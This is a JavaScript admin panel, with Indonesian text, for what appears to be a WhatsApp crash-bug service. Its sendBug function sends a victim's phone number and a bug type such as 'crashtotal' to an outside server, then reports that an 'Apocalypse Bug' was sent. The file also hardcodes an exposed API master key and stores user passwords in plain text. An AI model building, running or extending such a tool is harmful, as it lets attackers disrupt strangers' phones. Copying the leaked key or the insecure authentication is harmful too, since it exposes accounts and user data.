
// admin.js

const BIN_ID = "686d355c8561e97a5033af6a"; // Ganti dengan BIN ID kamu
const API_KEY = "$2a$10$2rTDdHq.CHA3tkZbYEEJO.yx/8VtkA1H2cD5Yow/ktJDTVXfqK0R2"; // Ganti dengan API KEY kamu

function saveSession(user) {
  sessionStorage.setItem("currentUser", JSON.stringify(user));
}
function getSession() {
  return JSON.parse(sessionStorage.getItem("currentUser"));
}
function logout() {
  sessionStorage.removeItem("currentUser");
  location.reload();
}

async function getUsers() {
  try {
    const res = await fetch(`https://api.jsonbin.io/v3/qs/${BIN_ID}`, {
      headers: { "X-Master-Key": API_KEY },
    });
    if (!res.ok) throw new Error("Fetch failed!");
    const json = await res.json();
    return json.record;
  } catch (err) {
    console.error("Error getUsers():", err);
    return [];
  }
}
async function saveUsers(users) {
  try {
    const res = await fetch(`https://api.jsonbin.io/v3/qs/${BIN_ID}`, {
      method: "PUT",
      headers: {
        "Content-Type": "application/json",
        "X-Master-Key": API_KEY,
      },
      body: JSON.stringify(users),
    });
    if (!res.ok) throw new Error("Gagal menyimpan data!");
    return true;
  } catch (err) {
    console.error("saveUsers error:", err);
    return false;
  }
}

async function login() {
  const user = document.getElementById("username").value.trim();
  const pass = document.getElementById("password").value.trim();
  const result = document.getElementById("login-result");

  const users = await getUsers();
  const found = users.find(u => u.username === user && u.password === pass);

  if (found) {
    saveSession(found);
    showDashboard(found);
  } else {
    result.innerText = "❌ Username atau Password salah!";
    result.style.color = "crimson";
  }
}

function showDashboard(user) {
  document.getElementById("login-box").style.display = "none";
  document.getElementById("main-box").style.display = "block";
  document.getElementById("userLabel").innerText = user.username;
}

window.onload = () => {
  const user = getSession();
  if (user) showDashboard(user);
};

let selectedBug = "crashtotal";
document.querySelectorAll(".bug-card").forEach(card => {
  card.addEventListener("click", () => {
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
    card.classList.add("active");
    selectedBug = card.getAttribute("data-bug");
  });
});

function showPopup(message) {
  document.getElementById("popup-message").innerHTML = message;
  document.getElementById("popup").style.display = "flex";
}
function closePopup() {
  document.getElementById("popup").style.display = "none";
}

async function sendBug() {
  const input = document.getElementById("target").value.trim();
  const resDiv = document.getElementById("result");
  const btn = document.getElementById("sendBtn");

  if (!/^\d{8,15}$/.test(input)) {
    resDiv.innerText = "Masukkan nomor WA yang valid!";
    resDiv.style.color = "crimson";
    return;
  }

  const chatId = `${input}@s.whatsapp.net`;
  btn.disabled = true;
  const originalHTML = btn.innerHTML;
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';
  resDiv.innerText = "";

  try {
    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);
    await res.json();
    showPopup(`Apocalypse Bug berhasil dikirim ke <b>${input}</b>`);
  } catch (err) {
    resDiv.innerText = "❌ Gagal mengirim: " + err;
    resDiv.style.color = "crimson";
  }

  btn.disabled = false;
  btn.innerHTML = originalHTML;
}

async function addUser() {
  const username = document.getElementById("newUser").value.trim();
  const password = document.getElementById("newPass").value.trim();
  const role = document.getElementById("newRole").value;
  const result = document.getElementById("manage-result");

  if (!username || !password) {
    result.innerText = "❌ Username dan Password wajib diisi!";
    return;
  }

  const users = await getUsers();
  if (users.find(u => u.username === username)) {
    result.innerText = "❌ Username sudah terdaftar!";
    return;
  }

  users.push({ username, password, role });
  const success = await saveUsers(users);
  result.innerText = success ? "✅ User berhasil ditambahkan!" : "❌ Gagal menyimpan user!";
}

async function changeRole() {
  const username = document.getElementById("targetUsername").value.trim();
  const newRole = document.getElementById("newRoleChange").value;
  const result = document.getElementById("manage-result");

  const users = await getUsers();
  const user = users.find(u => u.username === username);
  if (!user) {
    result.innerText = "❌ User tidak ditemukan!";
    return;
  }

  user.role = newRole;
  const success = await saveUsers(users);
  result.innerText = success ? "✅ Role berhasil diubah!" : "❌ Gagal mengubah role!";
}

async function changePassword() {
  const oldPass = document.getElementById("oldPass").value.trim();
  const newPass1 = document.getElementById("newPass1").value.trim();
  const newPass2 = document.getElementById("newPass2").value.trim();
  const result = document.getElementById("password-result");

  const session = getSession();
  if (!session) {
    result.innerText = "❌ Anda tidak login.";
    return;
  }
  if (newPass1 !== newPass2) {
    result.innerText = "❌ Password baru tidak cocok!";
    return;
  }
  if (session.password !== oldPass) {
    result.innerText = "❌ Password lama salah!";
    return;
  }

  const users = await getUsers();
  const user = users.find(u => u.username === session.username);
  if (!user) {
    result.innerText = "❌ User tidak ditemukan!";
    return;
  }

  user.password = newPass1;
  const success = await saveUsers(users);
  if (success) {
    result.innerText = "✅ Password berhasil diubah!";
    saveSession(user);
  } else {
    result.innerText = "❌ Gagal menyimpan perubahan!";
  }
}

async function addSimpleUser() {
  const username = document.getElementById("simpleUsername").value.trim();
  const password = document.getElementById("simplePassword").value.trim();
  const result = document.getElementById("simple-result");

  if (!username || !password) {
    result.innerText = "❌ Username dan Password wajib diisi!";
    return;
  }

  const users = await getUsers();
  if (users.find(u => u.username === username)) {
    result.innerText = "❌ Username sudah terdaftar!";
    return;
  }

  users.push({ username, password, role: "user" });
  const success = await saveUsers(users);
  result.innerText = success ? "✅ User berhasil ditambahkan!" : "❌ Gagal menyimpan user!";
}
